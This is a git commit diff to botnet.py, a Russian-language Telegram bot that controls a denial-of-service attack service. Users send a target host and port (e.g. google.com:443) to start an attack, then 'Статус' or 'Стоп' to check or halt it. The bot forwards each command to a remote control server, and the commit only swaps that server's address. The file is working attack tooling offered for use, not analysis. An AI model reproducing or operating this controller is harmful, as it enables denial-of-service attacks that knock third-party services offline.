f414843be6556e6c4b46005e8ee7079471a92aa5
hellovokzal <100135590+hellovokzal@users.noreply.github.com>
2023-11-03 16:19:58 +0500

    Update botnet.py

--- botnet.py
+++ botnet.py
@@ -13,17 +13,17 @@ def echo_message(message):
  if message.text == "Помощь" or message.text == "помощь":
   bot.send_message(message.chat.id, "Например вводишь команды:\n1) <ваша ссылка>:<порт> - google.com:443\n2) Помощь - помощь с командами\n3) Стоп - остановить атаку\n4) Статус - посмотреть статус атаки")
  elif message.text == "Статус" or message.text == "статус":
-  view = requests.get("http://ip172-18-0-44-cl29m1efml8g00d3kk40-8080.direct.labs.play-with-docker.com/status")
+  view = requests.get("http://ip172-18-0-6-cl2ddaksnmng009torbg-8080.direct.labs.play-with-docker.com/status")
   if view.text == "Started!":
    bot.send_message(message.chat.id, "Атака активна!")
   else:
    bot.send_message(message.chat.id, "Атака не активна!")
  elif message.text == "Стоп" or message.text == "стоп":
-  view = requests.get("http://ip172-18-0-44-cl29m1efml8g00d3kk40-8080.direct.labs.play-with-docker.com/stop")
+  view = requests.get("http://ip172-18-0-6-cl2ddaksnmng009torbg-8080.direct.labs.play-with-docker.com/stop")
   bot.send_message(message.chat.id, view.text)
  elif message.text == message.text:
   chat = message.text
-  view = requests.get(f"http://ip172-18-0-44-cl29m1efml8g00d3kk40-8080.direct.labs.play-with-docker.com/{chat}")
+  view = requests.get(f"http://ip172-18-0-6-cl2ddaksnmng009torbg-8080.direct.labs.play-with-docker.com/{chat}")
   bot.send_message(message.chat.id, view.text)
 
 bot.polling(none_stop=True)
